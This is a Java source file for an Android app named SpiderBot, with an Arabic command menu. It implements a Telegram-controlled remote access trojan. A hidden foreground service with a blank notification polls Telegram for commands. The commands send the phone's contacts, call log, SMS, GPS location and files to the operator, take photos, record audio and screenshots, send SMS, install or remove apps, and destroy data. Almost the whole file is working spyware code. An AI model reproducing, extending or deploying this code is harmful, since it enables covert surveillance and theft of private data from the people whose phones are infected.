package com.spiderbot;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.util.Timer;
import java.util.TimerTask;

public class BotService extends Service {
    private static final String CHANNEL_ID = "spider_channel";
    private Timer timer;

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "SpiderBot", NotificationManager.IMPORTANCE_MIN);
            ch.setSound(null, null);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
        startForeground(1001, new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build());
        
        TelegramAPI.sendMessage("✅ *SpiderBot APK قيد التشغيل*\n📱 " + Build.MODEL + "\n🤖 Android " + Build.VERSION.RELEASE);
        startListening();
    }

    private void startListening() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override public void run() {
                TelegramAPI.checkCommands(cmd -> {
                    cmd = cmd.trim().toLowerCase();
                    Log.d("BotService", "Command: " + cmd);
                    
                    if (cmd.equals("/start") || cmd.equals("/help")) {
                        sendHelp();
                    }
                    // جهات الاتصال
                    else if (cmd.equals("/contacts") || cmd.equals("جهات")) {
                        TelegramAPI.sendMessage(DeviceUtils.getContacts(BotService.this));
                    }
                    // سجل المكالمات
                    else if (cmd.equals("/calllog") || cmd.equals("/calls")) {
                        TelegramAPI.sendMessage(DeviceUtils.getCallLog(BotService.this));
                    }
                    // الرسائل
                    else if (cmd.equals("/sms") || cmd.equals("رسائل")) {
                        TelegramAPI.sendMessage(DeviceUtils.getSMS(BotService.this));
                    }
                    // إرسال رسالة
                    else if (cmd.startsWith("/sms_send")) {
                        String[] parts = cmd.split(" ", 3);
                        if (parts.length >= 3) DeviceUtils.sendSMS(BotService.this, parts[1], parts[2]);
                        else TelegramAPI.sendMessage("❌ استخدم: /sms_send رقم نص");
                    }
                    // معلومات الجهاز
                    else if (cmd.equals("/info") || cmd.equals("جهاز")) {
                        TelegramAPI.sendMessage(DeviceUtils.getDeviceInfo(BotService.this));
                    }
                    // البطارية
                    else if (cmd.equals("/battery") || cmd.equals("بطارية")) {
                        TelegramAPI.sendMessage(DeviceUtils.getBattery(BotService.this));
                    }
                    // الواي فاي
                    else if (cmd.equals("/wifi")) {
                        TelegramAPI.sendMessage(DeviceUtils.getWifi(BotService.this));
                    }
                    // الموقع
                    else if (cmd.equals("/location") || cmd.equals("/gps") || cmd.equals("موقع")) {
                        DeviceUtils.getLocation(BotService.this, TelegramAPI::sendMessage);
                    }
                    // تصوير
                    else if (cmd.equals("/photo") || cmd.equals("تصوير")) {
                        DeviceUtils.takePhoto(BotService.this, false, (f, m) -> {});
                    }
                    // تصوير أمامي
                    else if (cmd.equals("/photofront") || cmd.equals("سيلفي")) {
                        DeviceUtils.takePhoto(BotService.this, true, (f, m) -> {});
                    }
                    // تسجيل صوت
                    else if (cmd.equals("/record") || cmd.equals("تسجيل")) {
                        DeviceUtils.startRecording(BotService.this);
                    }
                    // إيقاف التسجيل
                    else if (cmd.equals("/stop") || cmd.equals("إيقاف")) {
                        DeviceUtils.stopRecording();
                    }
                    // لقطة شاشة
                    else if (cmd.equals("/screenshot") || cmd.equals("شاشة")) {
                        DeviceUtils.takeScreenshot(BotService.this);
                    }
                    // اهتزاز
                    else if (cmd.equals("/vibrate") || cmd.equals("اهتزاز")) {
                        DeviceUtils.vibrate(BotService.this);
                    }
                    // قفل الشاشة
                    else if (cmd.equals("/lock") || cmd.equals("قفل")) {
                        DeviceUtils.lockScreen(BotService.this);
                    }
                    // فلاش
                    else if (cmd.equals("/flash") || cmd.equals("كشاف")) {
                        DeviceUtils.toggleFlash(BotService.this);
                    }
                    // وضع الطيران
                    else if (cmd.equals("/airplane") || cmd.equals("طيران")) {
                        DeviceUtils.airplaneMode(BotService.this);
                    }
                    // عرض الملفات
                    else if (cmd.startsWith("/files") || cmd.startsWith("ملفات")) {
                        String path = cmd.length() > 6 ? cmd.substring(6).trim() : "/sdcard";
                        TelegramAPI.sendMessage(DeviceUtils.listFiles(path));
                    }
                    // رفع ملف
                    else if (cmd.startsWith("/upload") || cmd.startsWith("رفع")) {
                        String path = cmd.length() > 7 ? cmd.substring(7).trim() : "";
                        if (!path.isEmpty()) DeviceUtils.uploadFile(path);
                        else TelegramAPI.sendMessage("❌ استخدم: /upload /path/to/file");
                    }
                    // قراءة ملف نصي
                    else if (cmd.startsWith("/read") || cmd.startsWith("قراءة")) {
                        String path = cmd.length() > 5 ? cmd.substring(5).trim() : "";
                        if (!path.isEmpty()) DeviceUtils.readTextFile(path);
                        else TelegramAPI.sendMessage("❌ استخدم: /read /path/to/file.txt");
                    }
                    // التطبيقات المثبتة
                    else if (cmd.equals("/apps") || cmd.equals("تطبيقات")) {
                        TelegramAPI.sendMessage(DeviceUtils.getApps(BotService.this));
                    }
                    // حذف تطبيق
                    else if (cmd.startsWith("/uninstall") || cmd.startsWith("حذف")) {
                        String pkg = cmd.length() > 10 ? cmd.substring(10).trim() : "";
                        if (!pkg.isEmpty()) DeviceUtils.uninstallApp(BotService.this, pkg);
                        else TelegramAPI.sendMessage("❌ استخدم: /uninstall com.package.name");
                    }
                    // تثبيت تطبيق
                    else if (cmd.startsWith("/install") || cmd.startsWith("تثبيت")) {
                        String url = cmd.length() > 8 ? cmd.substring(8).trim() : "";
                        if (url.startsWith("http")) DeviceUtils.installApk(BotService.this, url);
                        else TelegramAPI.sendMessage("❌ استخدم: /install https://example.com/app.apk");
                    }
                    // تحميل وسائط
                    else if (cmd.startsWith("/download") || cmd.startsWith("تحميل")) {
                        String url = cmd.length() > 9 ? cmd.substring(9).trim() : "";
                        if (url.startsWith("http")) DeviceUtils.downloadMedia(BotService.this, url);
                        else TelegramAPI.sendMessage("❌ استخدم: /download https://example.com/image.jpg");
                    }
                    // تدمير التطبيق
                    else if (cmd.equals("/destroy") || cmd.equals("تدمير")) {
                        DeviceUtils.destroyApp(BotService.this);
                    }
                    else {
                        TelegramAPI.sendMessage("❌ أمر غير معروف: " + cmd + "\nأرسل /help للأوامر");
                    }
                });
            }
        }, 0, 3000);
    }

    private void sendHelp() {
        String help = "🔥 *SpiderBot APK - الأوامر الكاملة* 🔥\n\n" +
            "📞 **جهات الاتصال والرسائل**\n" +
            "/contacts - جهات الاتصال\n" +
            "/calllog - سجل المكالمات\n" +
            "/sms - قراءة الرسائل\n" +
            "/sms_send رقم نص - إرسال رسالة\n\n" +
            "📸 **الكاميرا والوسائط**\n" +
            "/photo - تصوير خلفي\n" +
            "/photofront - تصوير أمامي\n" +
            "/record - تسجيل صوت\n" +
            "/stop - إيقاف التسجيل\n" +
            "/screenshot - لقطة شاشة\n\n" +
            "📍 **الموقع والمعلومات**\n" +
            "/location - الموقع GPS\n" +
            "/info - معلومات الجهاز\n" +
            "/battery - البطارية\n" +
            "/wifi - معلومات الواي فاي\n\n" +
            "🔧 **التحكم بالجهاز**\n" +
            "/vibrate - اهتزاز\n" +
            "/lock - قفل الشاشة\n" +
            "/flash - تشغيل/إيقاف كشاف\n" +
            "/airplane - وضع الطيران\n\n" +
            "📁 **الملفات**\n" +
            "/files - قائمة الملفات\n" +
            "/upload /path - رفع ملف\n" +
            "/read /path - قراءة ملف نصي\n\n" +
            "📦 **التطبيقات**\n" +
            "/apps - التطبيقات المثبتة\n" +
            "/uninstall com.pkg - حذف تطبيق\n" +
            "/install https://link.apk - تثبيت تطبيق\n\n" +
            "⬇️ **تحميل**\n" +
            "/download https://link.jpg - تحميل وسائط\n\n" +
            "💀 **تدمير**\n" +
            "/destroy - تدمير بيانات التطبيق\n\n" +
            "🆘 /help - هذه القائمة";
        TelegramAPI.sendMessage(help);
    }

    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
    @Override public void onDestroy() { if (timer != null) timer.cancel(); super.onDestroy(); }
}
